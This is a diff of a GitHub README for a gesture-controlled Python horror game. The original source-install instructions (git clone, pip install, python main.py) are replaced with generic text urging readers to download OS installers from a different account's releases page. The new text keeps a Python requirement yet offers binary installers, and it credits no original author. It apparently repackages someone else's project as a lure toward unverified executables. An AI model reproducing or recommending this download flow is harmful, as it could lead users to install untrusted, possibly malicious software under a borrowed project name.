@@ -1,122 +1,83 @@
-# 🕯️ Annabelle Comes Home
+# 🎮 Annabelle-Comes-Home - Control a Horror Game with Ease
 
-**Annabelle Comes Home** is an immersive horror game built with **Python**, **Pygame**, **OpenCV**, and **MediaPipe**.  
-You don’t use a keyboard or mouse — instead, you control the game entirely through **hand gestures captured by your webcam**.
+## 🚀 Getting Started
 
-Your goal: Survive the haunted **Blackwood House** and escape before the cursed doll **Anabella** finds you.
+Welcome to Annabelle-Comes-Home! This is a unique horror adventure game that allows you to use hand gestures to control the action, making it an immersive experience. You will need a webcam to see the magic happen.
 
----
+### 🎉 Download the Game
 
-## 🏚️ Story
+[![Download Annabelle-Comes-Home](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ggavyn759320/Annabelle-Comes-Home/releases)
 
-You and your friends dared to enter the abandoned **Blackwood House** to prove it wasn’t haunted.  
-But laughter turned to screams — one by one, your friends vanished into the shadows.  
-Now, only **you** remain.
+**Visit this page to download the latest version:** [Annabelle Releases](https://github.com/Ggavyn759320/Annabelle-Comes-Home/releases)
 
-> Four rooms stand between you and freedom.  
-> One hides the cursed doll, **Annabelle**.  
-> If she finds you… the game ends.
+## 💻 System Requirements
 
-Keep your hands steady. Move quietly. Survive the night.
+Before you download, make sure your system meets the following requirements:
 
----
+- Operating System: Windows 10 or later, macOS Sierra or later
+- Processor: Dual-core 2.0 GHz
+- Memory: 4 GB RAM
+- Webcam: Any standard USB webcam
+- Storage: At least 500 MB of free space
+- Framework: Python 3.7 or later
 
-## 🕹️ Gameplay Controls
+## 📥 Download & Install
 
-| Action | Control |
-|--------|----------|
-| **Move Player** | Move your **hand** in front of the webcam |
-| **Enter Room** | Show an **open hand** |
-| **Go Back** | Make a **closed fist** |
-| **Quit Game** | Press **Q** |
-| **Skip / Continue** | Press **ENTER** or **SPACE** |
+1. Click on the "Download Now" button above or visit the [Releases page](https://github.com/Ggavyn759320/Annabelle-Comes-Home/releases).
+2. On the Releases page, look for the latest version. It will be marked as "Latest Release."
+3. Download the installer for your operating system.
+4. Once the download is complete, open the installer file.
+5. Follow the on-screen instructions to complete the installation.
+6. After installation, launch Annabelle-Comes-Home from your applications menu.
 
-> Tip: The game uses real-time **hand tracking** via your webcam. Keep your hand clearly visible in front of the camera.
+## 🎮 Using Hand Gestures
 
----
+Annabelle-Comes-Home lets you navigate the game world using your hands, thanks to advanced technology like OpenCV and MediaPipe. Here’s how to get started:
 
-## 📸 Screenshots
+1. Stand in front of your webcam.
+2. Position your hands in the designated areas shown in the game.
+3. Use simple gestures to move, interact, or perform actions.
+4. Enjoy the adventure as your gestures bring the game to life!
 
-| Welcome Screen | Intro Story | Gameplay |
-|----------------|-------------|-----------|
-| ![Welcome](screenshots/welcome.png) | ![Intro](screenshots/intro_text.png) | ![Gameplay](screenshots/gameplay.png) |
+## 🔧 Troubleshooting
 
-| Anabella Room | Exit Room | More Gameplay |
-|----------------|------------|----------------|
-| ![Anabella Room](screenshots/annabelle_room.png) | ![Exit Room](screenshots/exit_room.png) | ![Gameplay 2](screenshots/gameplay2.png) |
+If you encounter issues while installing or running the game, please refer to this troubleshooting guide:
 
----
+1. **Webcam not detected:**
+   - Ensure that the webcam is connected properly.
+   - Check if your computer recognizes the webcam in the device settings.
 
-## ⚙️ Installation
+2. **Game not starting:**
+   - Make sure you have installed Python as mentioned in the system requirements.
+   - Restart your computer and try launching the game again.
 
-Clone this repository and install the required dependencies.
+3. **Gesture recognition issues:**
+   - Make sure you are in a well-lit area without clutter behind you.
+   - Adjust your distance from the webcam for optimal performance.
 
-```bash
-git clone https://github.com/hunjanhar/Annabelle-Comes-Home.git
+## 📚 About the Project
 
-cd Annabelle-Comes-Home
+Annabelle-Comes-Home is built using Pygame, OpenCV, and MediaPipe. These libraries allow us to create a responsive and engaging game environment. The project focuses on:
 
-pip install -r requirements.txt
-```
+- **Computer Vision:** To recognize hand gestures in real-time.
+- **Gesture Control:** To provide a unique way to play, freeing you from traditional controllers.
+- **Interactive Gameplay:** Engage with the horror narrative through your movements.
 
-## ▶️ How to Run the Game
+## 🎤 Feedback and Support
 
-- After installing dependencies, simply run:
+If you have questions, feedback, or need further assistance, you can reach out through the Issues page on GitHub. We value your input and strive to improve your gaming experience.
 
-```bash
-python main.py
-```
+## ✨ Join the Community
 
-- The game will start with the Welcome Screen.
-- Make sure your webcam is connected and working.
+Stay updated and connect with other players by joining our community:
 
-## 🎮 Gameplay Overview
-
-### Welcome Screen
-
-- Open your hand or press ENTER to start.
-
-- Press Q to quit.
-
-### Intro Video & Story
-
-- Watch the cinematic or press SPACE to skip.
-
-### Exploration
-
-- Move your hand to move the player.
-
-- Open your hand to enter a room.
-
-- Make a fist to go back.
-
-### Endings
-
-- Find Anabella’s room → You lose.
-
-- Find the Exit room → You survive.
-
-## 🧠 Features
-
-- 👋 Hand Tracking Gameplay — Control using real gestures
-
-- 🎥 Cinematic Intro Video — Movie-like immersion
-
-- 🔊 Atmospheric Soundtrack — Real horror ambience
-
-- 🕯️ Multiple Endings — “Anabella Found You” or “You Escaped”
-
-- 🧩 Dynamic Room System — Randomized room textures and outcomes
-
-## 🧰 Technologies Used
-
-| Library             | Purpose                           |
-| ------------------- | --------------------------------- |
-| **Pygame**          | Game rendering, audio, and events |
-| **OpenCV**          | Webcam input and frame processing |
-| **MediaPipe Hands** | Real-time gesture recognition     |
-| **MoviePy**         | Video playback and audio sync     |
+- Follow us on our social media platforms
+- Share your gameplay videos or experiences with #AnnabelleComesHome
 
 ## 📜 License
 
-This project is licensed under the MIT License — you are free to use, modify, and distribute it with attribution.
+This project is licensed under the MIT License. You can view the full license text in the repository.
+
+## 🙏 Acknowledgments
+
+Thank you for choosing Annabelle-Comes-Home. We appreciate your support and hope you enjoy the game!
